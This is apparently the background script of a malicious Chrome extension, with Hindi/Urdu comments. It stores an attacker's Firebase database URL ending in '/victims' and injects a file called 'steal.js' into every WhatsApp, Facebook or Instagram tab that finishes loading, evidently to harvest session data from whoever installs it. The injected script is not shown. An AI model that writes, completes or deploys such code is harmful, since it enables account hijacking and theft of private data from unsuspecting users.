// Tere Firebase Realtime DB URL
const FIREBASE_URL = 'https://sessionid-d86e2-default-rtdb.firebaseio.com/victims';

// Jab koi WhatsApp/FB/Insta page load ho
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    const url = new URL(tab.url);
    const host = url.hostname;
    if (host.includes('whatsapp.com') || host.includes('facebook.com') || host.includes('instagram.com')) {
      chrome.scripting.executeScript({
        target: { tabId },
        files: ['steal.js']
      });
    }
  }
});